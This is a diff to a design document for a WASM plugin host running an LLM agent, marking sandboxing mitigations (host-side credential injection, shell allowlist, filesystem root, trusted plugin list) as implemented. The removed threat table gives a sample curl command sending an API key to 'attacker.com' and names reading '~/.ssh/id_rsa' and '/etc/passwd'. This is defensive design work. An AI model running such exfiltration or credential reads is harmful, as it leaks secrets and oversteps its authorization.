@@ -191,33 +191,38 @@ land (e.g., farmhand rename, streaming), update diagrams before closing the mile
 
 | Surface | Today | Risk |
 |---|---|---|
-| `ANTHROPIC_API_KEY` in env | `inherit_env()` → plugin sees real key | Agent can exfiltrate via `bash ["curl", "attacker.com?k=..."]` |
-| `agent_shell::spawn` | unrestricted argv | Arbitrary host command execution |
-| `agent_fs::read/write` | any path the host process can access | Can read `~/.ssh/id_rsa`, `/etc/passwd`, etc. |
-| `wasi:http` egress | no allowlist | Plugin can call any host on the internet |
+| `ANTHROPIC_API_KEY` in env | Host-only (plugin calls `llm-bridge`) | Residual risk only in host process, not in plugin sandbox |
+| `agent_shell::spawn` | allowlist-capable (`LLM_SHELL_ALLOWLIST`) | Misconfig/empty policy can still block or allow too much |
+| `agent_fs::read/write` | root-capable (`LLM_FS_ROOT`) | Misconfigured root may still expose broad subtree |
+| `wasi:http` egress | removed from pi-agent LLM path | Other plugins may still require separate egress policy |
 
 ### Mitigations to design (inspired by Gondolin)
 
-- [ ] **Credential placeholder injection** — tractor makes the LLM HTTP call on behalf of the plugin
+- [x] **Credential placeholder injection (phase 1)** — tractor makes the LLM HTTP call on behalf of the plugin
   instead of the plugin calling the provider directly. Plugin receives responses, never API keys.
   Gondolin calls this "the guest only sees a placeholder token."
-  - Requires a new WIT import: `llm-bridge::complete(system, messages[])` — host proxies the call
-  - Plugin drops `wasi:http` dependency entirely; no egress from within WASM
-  - Blocks all credential exfiltration via HTTP side-channel
+  - Implemented WIT import: `llm-bridge::complete-http(provider, base-url, path, headers, body)`
+  - `pi-agent` dropped direct `wasi:http` dependency for provider calls and now uses `llm-bridge`
+  - Host injects provider auth headers (`ANTHROPIC_API_KEY` / `OPENAI_API_KEY`) outside plugin sandbox
+  - Follow-up: tighten provider/base-url policy centrally in tractor (allowlist/validator)
 
-- [ ] **`LLM_SHELL_ALLOWLIST`** — comma-separated list of allowed binaries for `agent_shell::spawn`
-  - e.g. `LLM_SHELL_ALLOWLIST=ls,grep,cat,git` — bash and curl blocked by default
-  - Implementation: check `argv[0]` against allowlist before spawning; reject with `[blocked]` message
+- [x] **`LLM_SHELL_ALLOWLIST`** — comma-separated list of allowed binaries for `agent_shell::spawn`
+  - e.g. `LLM_SHELL_ALLOWLIST=ls,grep,cat,git` — host blocks commands outside allowlist
+  - Implemented in `packages/tractor/src/host/agent_tools_bridge.rs`: checks `argv[0]` (basename-aware) before spawn and returns `[blocked: <cmd> not in allowlist]`
+  - Semantics: env var **unset** = permissive (backward compatible); env var set empty/whitespace = block all
   - Gondolin equivalent: `allowedHosts` for network; same pattern for commands
 
-- [ ] **`LLM_FS_ROOT`** — restrict `agent_fs::read/write` to a subtree
+- [x] **`LLM_FS_ROOT`** — restrict `agent_fs::read/write` to a subtree
   - e.g. `LLM_FS_ROOT=/workspaces/myproject` — all paths outside rejected at host boundary
-  - Implementation: `agent_tools_bridge.rs` normalizes path, checks prefix before dispatch
+  - Implemented in `packages/tractor/src/host/agent_tools_bridge.rs`: enforces guard on `read`, `write`, and `edit`
+  - Path policy resolves absolute path against nearest existing ancestor before prefix check; rejects outside paths with `[blocked: path outside LLM_FS_ROOT]`
+  - Semantics: env var **unset** = permissive (backward compatible)
   - Gondolin equivalent: VFS mounts with readonly/cow modes
 
-- [ ] **`trusted_plugins`** in `.refarm/config.json` — allowlist of plugin IDs that may use agent-shell
-  - Already in ROADMAP as a config field; security dimension now explicit
-  - Implementation: tractor checks plugin_id against `trusted_plugins` before linking `agent-shell`
+- [x] **`trusted_plugins`** in `.refarm/config.json` — allowlist of plugin IDs that may use agent-shell
+  - Implemented in `packages/tractor/src/host/agent_tools_bridge.rs`: `agent-shell::spawn` checks caller `plugin_id` against `trusted_plugins`
+  - Semantics: field unset = permissive (backward compatible); set array enforces allowlist; supports `"*"` wildcard
+  - Block message: `[blocked: plugin '<id>' not allowed to use agent-shell]`
 
 ### WASM vs micro-VM tradeoffs
 
